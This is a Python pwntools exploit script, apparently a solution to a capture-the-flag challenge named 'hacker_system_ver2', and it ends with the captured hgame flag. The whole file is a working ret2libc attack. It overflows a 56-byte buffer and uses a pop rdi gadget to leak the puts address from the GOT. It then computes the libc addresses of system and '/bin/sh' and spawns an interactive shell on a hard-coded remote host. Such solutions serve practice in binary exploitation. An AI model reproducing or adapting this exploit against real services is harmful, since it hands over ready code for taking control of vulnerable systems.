from pwn import *

context.log_level = 'debug'
local = 0

if local:
	p = process('./hacker_system_ver2')
	elf = ELF('./hacker_system_ver2')
	libc = ELF('./libc64.so')
else:
	p = remote('111.230.149.72 ', 10008)
	elf = ELF('./hacker_system_ver2')
	libc = ELF('./libc64.so')

def printinfo(length, name):
	p.recvuntil("length:")
	p.sendline(str(length))
	p.recvuntil("name:")
	p.sendline(name)

#part 1
offset = 56
putsplt = elf.symbols['puts']
putsgot = elf.got['puts']
popret = 0x0000000000400fb3 #pop rdi; ret
payload = 'A'*56 + p64(popret) + p64(putsgot) + p64(putsplt) + p64(0x400C63)
# gdb.attach(p)
p.recvuntil(">")
p.sendline("2")
printinfo(len(payload) + 1, payload)
p.recvuntil("!!\n")
puts = u64(p.recv(6).ljust(8, '\x00'))
print "puts: ", hex(puts)

#part 2
system_addr = puts - (libc.symbols['puts'] - libc.symbols['system'])
binsh_addr = puts - (libc.symbols['puts'] - next(libc.search("/bin/sh")))
print "system_addr: ", hex(system_addr)
print "binsh_addr: ", hex(binsh_addr)
payload = 'A'*56 + p64(popret) + p64(binsh_addr) + p64(system_addr) + p64(0x400C63)
printinfo(len(payload) + 1, payload)
p.interactive()

#hgame{damn_it__big_hacker_you_win_the_flag_again}
